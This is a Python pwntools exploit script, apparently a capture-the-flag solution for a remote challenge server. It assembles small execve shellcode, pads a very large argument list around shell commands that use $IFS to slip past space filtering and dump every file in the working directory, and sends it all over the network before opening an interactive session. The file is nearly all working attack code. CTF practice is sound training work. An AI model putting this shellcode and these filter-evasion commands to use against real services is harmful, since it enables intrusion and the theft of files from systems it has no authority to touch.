#!/usr/bin/env python3
from pwn import *
from collections import Counter
import os
import base64

context.arch = "amd64"
context.terminal = ["/usr/bin/kitty"]
# context.log_level = "critical"
context.encoding = 'latin'

cmds = [r"/bin/sh", r"sh", r"-c", "cat$IFS*>/proc/1/fd/1", "#"]
# cmds = [r"/bin/sh", r"sh", r"-c", "cat *|head -c1|tail -c1|grep l&&yes"]

sc = asm("""
         loop: jmp noloop
         jmp loop
         jmp loop
         noloop:
         pop rdi
         pop rdi
         push rsp
         pop rsi
         mov al, SYS_execve
         syscall
""")

# print(f"Shellcode len: {len(sc)}")
assert len(sc) <= 0xe

args = ""
for i in range(0x1104f - len(cmds)):
  args += " Z"

args = cmds + args.split()
args = str(args).replace(',', "").replace('[', '').replace(']', '').replace("'", "").replace("\"", "'")

left = Counter(args).get('Z')
args = args.strip() + ("Z" * (0x11f6f - left))

# p = process("./test.py")
# p = remote("localhost", 5000)
p = remote("chall.lac.tf", 31188)
p.sendline(base64.b64encode(sc))
time.sleep(1)

p.sendline(args)
time.sleep(1)
p.sendline("")
p.recvuntil("ZZZZzzzzZZZZzzzzZZZZzzzz")

p.interactive()

